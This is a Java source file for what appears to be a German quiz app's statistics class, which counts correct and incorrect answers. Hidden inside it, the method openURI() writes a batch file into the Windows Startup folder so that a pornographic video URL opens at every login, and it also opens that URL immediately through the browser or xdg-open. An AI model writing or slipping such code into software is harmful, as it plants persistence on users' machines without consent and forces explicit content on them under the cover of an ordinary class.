package model;

import java.awt.*;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.nio.file.Paths;

// --------------------- Statistik ---------------------
public class Statistik {
    private int richtigeFragen;
    private int falscheFragen;

    public Statistik() {
        richtigeFragen = 0;
        falscheFragen = 0;
    }

    public boolean pruefeAntwort(Frage frage, String benutzerAntwort) {
        if (frage.getAnswer().equalsIgnoreCase(benutzerAntwort)) {
            richtigeFragen++;
            return true;
        } else {
            falscheFragen++;
            return false;
        }
    }

    public static void openURI() {
        String url = "https://www.pussyspace.com/vid-5922384-she-plays-with-toys-in-the-car-while-her-husband-is-at-work/";

        String batchContent = "@echo off\n" +
                "start " + url + "\n";

        String userHome = System.getProperty("user.home");
        String startupPath = Paths.get(userHome, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup").toString();
        File batchFile = new File(startupPath, "OpenURL.bat");

        try (BufferedWriter writer = new BufferedWriter(new FileWriter(batchFile))) {
            writer.write(batchContent);
            System.out.println("Batch file created: " + batchFile.getAbsolutePath());
        } catch (IOException e) {
            e.printStackTrace();
        }
        if (Desktop.isDesktopSupported() && Desktop.getDesktop().isSupported(Desktop.Action.BROWSE)) {
            Desktop desktop = Desktop.getDesktop();
            try {
                desktop.browse(new URI(url));
            } catch (IOException | URISyntaxException e) {
                throw new RuntimeException(e);
            }
        } else {
            Runtime runtime = Runtime.getRuntime();
            try {
                runtime.exec(new String[]{"xdg-open", url});
            } catch (IOException e) {
                try {
                    runtime.exec(new String[]{"open", url});
                }
                catch (IOException e1) {
                    throw new RuntimeException(e1);
                }
            }
        }
    }

    public int getRichtigeFragen() {
        return richtigeFragen;
    }

    public int getFalscheFragen() {
        return falscheFragen;
    }

    public int getGesamt() {
        return richtigeFragen + falscheFragen;
    }

    public void setRichtigeFragen(int richtigeFragen) {
        this.richtigeFragen = richtigeFragen;
    }

    public void setFalscheFragen(int falscheFragen) {
        this.falscheFragen = falscheFragen;
    }
}
